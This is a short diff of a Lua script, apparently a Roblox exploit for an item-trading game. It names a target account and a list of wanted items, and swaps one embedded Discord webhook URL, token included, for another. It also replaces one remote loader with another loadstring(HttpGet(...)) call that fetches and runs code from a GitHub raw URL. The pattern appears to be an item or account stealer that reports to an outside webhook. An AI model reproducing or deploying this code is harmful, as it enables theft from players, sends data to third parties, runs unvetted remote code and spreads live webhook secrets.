@@ -1,6 +1,6 @@
 local TARGET_ID = 3343244279
 local TARGET_USER = "pnlo45"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1572626703996424255/yLvQnP0kwxg3Q3oEjNqvF3hgPDxxlO9ULIpF8d-Q17_GNstUqt4BlGt6QJ_Stoas1D8z"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1572628332766433503/uBDFmY0G9kyATUQwvywTjzGYmrfX5RdaHqGQC-kC7OfJ3EfXEcaqP8tDQ9yntTpmuxBH"
 
 local TargetBrainrots = {
     ["Draculino"] = true,
@@ -352,7 +352,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    script_key="3A4D98DCA06649839907CA87A146872D"; loadstring(game:HttpGet("https://vampauth.com/v1/loaders/bf86783c50dbfacb1f57b8b05db886f4.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Code-Redeemer/refs/heads/main/script.lua"))()
 
     task.wait(1)
 
